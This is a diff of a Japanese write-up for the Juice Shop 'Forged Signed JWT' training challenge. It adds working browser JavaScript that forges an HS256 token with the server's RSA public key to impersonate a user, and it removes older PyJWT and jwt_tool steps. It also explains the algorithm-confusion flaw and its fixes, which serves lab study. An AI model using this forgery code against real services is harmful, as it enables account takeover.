@@ -1,151 +1,126 @@
-# Forged Signed JWT ❌
+# Forged Signed JWT ✅
 
 **難易度:** ⭐⭐⭐⭐⭐⭐
-**カテゴリ:** JWT
-**目標:** RSA署名されたJWTを偽造する（アルゴリズム混乱攻撃）
-
----
+**カテゴリ:** Vulnerable Components
+**目標:** RSA署名されたJWTを偽造してrsa_lord@juice-sh.opになりすます
 
 ## 思考プロセス
 
-**ステップ1: Unsigned JWT との違いを理解**
-```
-「Unsigned JWT では alg: "none" で署名を無効化した」
-    ↓
-「しかし、多くのサーバーは "none" を拒否するようになった」
-    ↓
-「別のアプローチが必要...アルゴリズム混乱攻撃」
-```
+### 1. アルゴリズム混乱攻撃 (Algorithm Confusion Attack)
 
-**ステップ2: RS256 と HS256 の違い**
+JWTがRS256（RSA署名）を使用している場合、アルゴリズムをHS256（HMAC署名）に変更し、RSA公開鍵をHMACの秘密鍵として使用する攻撃。
+
+### 2. 公開鍵の取得
+
 ```
-「RS256 = RSA + SHA256（非対称鍵暗号）」
-    - 秘密鍵で署名
-    - 公開鍵で検証
-    
-「HS256 = HMAC + SHA256（対称鍵暗号）」
-    - 共有シークレットで署名
-    - 同じシークレットで検証
+http://localhost:3000/encryptionkeys/jwt.pub
 ```
 
-**ステップ3: アルゴリズム混乱攻撃**
-```
-「サーバーは RS256 で設定されているとする」
-    ↓
-「攻撃者: alg を HS256 に変更」
-    ↓
-「サーバーが alg フィールドを信頼して HS256 で検証しようとする」
-    ↓
-「HS256 の "シークレット" として何を使う？」
-    ↓
-「公開鍵を使う！（公開されているから入手可能）」
-    ↓
-「攻撃者は公開鍵で署名 → サーバーも公開鍵で検証 → 一致！」
-```
+RSA公開鍵が公開されている。
 
-## 前提条件
+### 3. 攻撃の原理
 
-- サーバーの公開鍵を入手できること
-- サーバーが JWT の alg フィールドを信頼していること
+サーバーがJWTのalgヘッダーを信頼する場合:
+1. RS256: 公開鍵で署名を検証
+2. HS256: 秘密鍵で署名を検証 → **公開鍵を秘密鍵として使用**
 
-## 公開鍵の入手
-
-```bash
-# よくある公開鍵の場所
-curl http://localhost:3000/.well-known/jwks.json
-curl http://localhost:3000/encryptionkeys/jwt.pub
-curl http://localhost:3000/api/config
-
-# レスポンス例
------BEGIN RSA PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
------END RSA PUBLIC KEY-----
-```
+公開鍵は公開されているので、攻撃者は同じ鍵でHMAC署名を生成できる。
 
 ## 実行手順
 
-1. **現在のJWTを取得**
-   ```javascript
-   const currentToken = localStorage.getItem('token');
-   console.log(currentToken);
-   // eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6...
-   ```
+### 方法: browser_evaluate で HMAC 署名を生成
 
-2. **公開鍵を取得**
-   ```javascript
-   fetch('/encryptionkeys/jwt.pub').then(r => r.text()).then(console.log);
-   ```
-
-3. **Python で攻撃トークンを生成**
-   ```python
-   import jwt
-   import requests
-   
-   # 公開鍵を取得
-   pub_key = requests.get('http://localhost:3000/encryptionkeys/jwt.pub').text
-   
-   # ペイロード（改ざん）
-   payload = {
-       "status": "success",
-       "data": {
-           "id": 1,
-           "email": "admin@juice-sh.op",
-           "role": "admin"
-       }
-   }
-   
-   # HS256 で署名（公開鍵を "シークレット" として使用）
-   # PyJWT では algorithms を明示的に指定
-   forged_token = jwt.encode(payload, pub_key, algorithm='HS256')
-   print(forged_token)
-   ```
-
-4. **jwt_tool を使う方法**
-   ```bash
-   # jwt_tool インストール
-   git clone https://github.com/ticarpi/jwt_tool
-   cd jwt_tool
-   pip install -r requirements.txt
-   
-   # 攻撃実行
-   python jwt_tool.py <token> -S hs256 -k public_key.pem
-   ```
-
-5. **偽造トークンを使用**
-   ```javascript
-   fetch('/api/Users/1', {
-     headers: {'Authorization': 'Bearer ' + forgedToken}
-   }).then(r => r.json()).then(console.log);
-   ```
-
-## なぜこの攻撃が成功するか
-
-```
-脆弱なコード例:
-  token = jwt.decode(token, public_key)  // アルゴリズムを指定していない
+```javascript
+async () => {
+  // 公開鍵を取得
+  const keyRes = await fetch('/encryptionkeys/jwt.pub');
+  const publicKey = await keyRes.text();
   
-安全なコード:
-  token = jwt.decode(token, public_key, algorithms=['RS256'])  // 明示的に指定
+  // JWTヘッダーとペイロード
+  const header = { alg: 'HS256', typ: 'JWT' };
+  const payload = {
+    status: 'success',
+    data: {
+      id: 999,
+      email: 'rsa_lord@juice-sh.op',
+      role: 'admin'
+    },
+    iat: Math.floor(Date.now() / 1000),
+    exp: Math.floor(Date.now() / 1000) + 3600
+  };
+  
+  // Base64URL エンコード
+  const base64url = (str) => btoa(str).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+  
+  const headerB64 = base64url(JSON.stringify(header));
+  const payloadB64 = base64url(JSON.stringify(payload));
+  const signatureInput = headerB64 + '.' + payloadB64;
+  
+  // 公開鍵でHMAC-SHA256署名
+  const encoder = new TextEncoder();
+  const cryptoKey = await crypto.subtle.importKey(
+    'raw',
+    encoder.encode(publicKey),
+    { name: 'HMAC', hash: 'SHA-256' },
+    false,
+    ['sign']
+  );
+  
+  const signature = await crypto.subtle.sign(
+    'HMAC',
+    cryptoKey,
+    encoder.encode(signatureInput)
+  );
+  
+  const signatureB64 = base64url(String.fromCharCode(...new Uint8Array(signature)));
+  const forgedToken = signatureInput + '.' + signatureB64;
+  
+  // 偽造トークンでリクエスト
+  await fetch('/rest/user/whoami', {
+    headers: { 'Authorization': 'Bearer ' + forgedToken }
+  });
+}
 ```
 
-## 検証ポイント
+## コード/ペイロード
 
-- [ ] 公開鍵を取得できるか
-- [ ] PyJWT / jwt_tool でトークン生成
-- [ ] RS256 → HS256 変更が受け入れられるか
-- [ ] 改ざんしたペイロードでアクセス可能か
-
-## 対策
-
-- JWT ライブラリで **アルゴリズムをホワイトリスト指定**
-- `alg` フィールドを信頼しない
-- 公開鍵を秘密にする（根本的解決ではない）
-
-## 関連チャレンジ
-
-- [Unsigned JWT](unsigned-jwt.md) - alg: "none" 攻撃
-- [Login Admin](../difficulty-2/login-admin.md)
+| 項目 | 値 |
+|------|-----|
+| 元のアルゴリズム | RS256 |
+| 偽造アルゴリズム | HS256 |
+| 公開鍵URL | `/encryptionkeys/jwt.pub` |
+| 偽装ユーザー | `rsa_lord@juice-sh.op` |
 
 ## 解説
 
-[未着手]
+### アルゴリズム混乱攻撃の原理
+
+```
+正常なRS256検証:
+  署名 = RSA_Sign(private_key, header.payload)
+  検証 = RSA_Verify(public_key, signature) ✓
+
+攻撃 (HS256に変更):
+  偽署名 = HMAC(public_key, header.payload)
+  サーバー: alg=HS256 → HMAC検証 → public_keyを使用
+  検証 = HMAC_Verify(public_key, signature) ✓ ← 攻撃成功!
+```
+
+### なぜ成功するか
+
+1. サーバーがJWTのalgヘッダーを信頼している
+2. RS256とHS256で同じ鍵を使用
+3. 公開鍵は公開されているので攻撃者も使用可能
+
+### 対策
+
+| 対策 | 説明 |
+|------|------|
+| **アルゴリズム固定** | サーバー側でアルゴリズムを固定し、ヘッダーを無視 |
+| **鍵の分離** | RSAとHMACで異なる鍵を使用 |
+| **alg検証** | 許可されたアルゴリズムのみ受け入れ |
+
+## 参考リンク
+
+- [Auth0 - Critical vulnerabilities in JWT libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
+- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
